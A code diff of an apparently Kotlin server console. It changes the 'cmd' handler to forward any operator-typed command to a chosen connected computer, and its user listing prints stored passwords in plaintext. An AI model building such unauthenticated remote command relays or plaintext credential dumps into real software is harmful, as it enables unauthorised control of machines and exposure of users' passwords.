@@ -55,7 +55,7 @@ fun main() {
                         println("Liste des utilisateurs : ")
                         val users = Manager().getDatabaseMap()[DatabaseName.USER] as UsersService
                         runBlocking {
-                            users.readAll().forEach{
+                            users.readAll().forEach {
                                 println("Nom : ${it.name} Password : ${it.password} Id : ${it.id}")
                             }
                         }
@@ -72,23 +72,31 @@ fun main() {
 
                     "mobilelist" -> {
                         println("Liste des mobiles connectés : ")
-                        mobileList.forEach{
+                        mobileList.forEach {
                             println("Socket : ${it.remoteAddress} ConnectionType : ${it}")
                         }
                     }
 
                     "computerlist" -> {
                         println("Liste des ordinateurs connectés : ")
-                        computerList.forEach{
-                            println("Socket : ${it.remoteAddress} ConnectionType : ${it}")
+                        computerList.forEach {
+                            try {
+                                println("Socket : ${it.remoteAddress}")
+                            } catch (e: Exception) {
+                                computerList.remove(it)
+                                logger.info(e.localizedMessage)
+                            }
                         }
                     }
 
                     "cmd" -> {
                         try {
+                            if (cmd.split(' ').size < 2) {
+                                throw Exception("Adresse de la cible manquante")
+                            }
                             val targetip = cmd.split(' ').get(1)
-                            var target : Socket? = null
-                            var sendChannel : ByteWriteChannel? = null
+                            var target: Socket? = null
+                            var sendChannel: ByteWriteChannel? = null
 
                             var exitcmd = false
 
@@ -105,30 +113,24 @@ fun main() {
 
                             while (!exitcmd) {
                                 println("Commande cible : ")
-                                val remoteCmd = readLine()
+                                val remoteCmd = readLine()?.removeSuffix("\n")
                                 if (remoteCmd != null) {
-                                    if (cmd.lowercase(Locale.getDefault()) == "exit") {
+                                    if (remoteCmd.lowercase() == "exit") {
+                                        println("Retour a la console serveur ...")
                                         exitcmd = true
                                     } else {
-                                        when (remoteCmd.lowercase(Locale.getDefault())) {
-                                            "stop" -> {
-                                                runBlocking {
-                                                    sendChannel!!.writeStringUtf8("stop\n")
-                                                }
-                                            }
-
+                                        runBlocking {
+                                            sendChannel!!.writeStringUtf8("${remoteCmd}\n")
                                         }
                                     }
                                 }
                             }
 
 
-
                         } catch (e: Exception) {
                             println(e.localizedMessage)
                         }
                     }
-
 
 
                     else -> {
@@ -140,7 +142,7 @@ fun main() {
 
     }.start()
 
-    // Declaration des variables globales
+// Declaration des variables globales
     lateinit var serverSocket: ServerSocket
     lateinit var selectorManager: SelectorManager
     lateinit var socket: Socket
